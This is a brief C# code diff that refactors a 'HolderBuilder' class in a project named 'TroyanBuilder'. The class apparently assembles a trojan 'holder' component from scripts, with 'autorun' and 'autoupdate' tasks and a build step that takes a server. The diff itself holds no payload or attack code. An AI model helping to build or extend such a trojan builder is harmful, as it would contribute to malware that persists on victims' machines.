@@ -1,16 +1,13 @@
-﻿using System.Text.Json;
-using System.Text.Json.Nodes;
-
-namespace TroyanBuilder;
+﻿namespace TroyanBuilder;
 
 public abstract class HolderBuilder: CustomBuilder
 {
     protected override string SourceDir => Path.Combine(Model.TroyanScriptDir, "holder");
     protected override string OutputFile => Model.Holder;
-
-    protected override string[] PrioritySources => new [] {"consts_body", "consts_autoextract", "utils"};
+    
     protected override string[] PriorityTasks => new [] { "autorun" };
     protected override string[] UnpriorityTasks => new [] {"autoupdate" };
+    protected override string EntryPoint => "holder";
 
     protected override void InternalBuild(string server)
     {
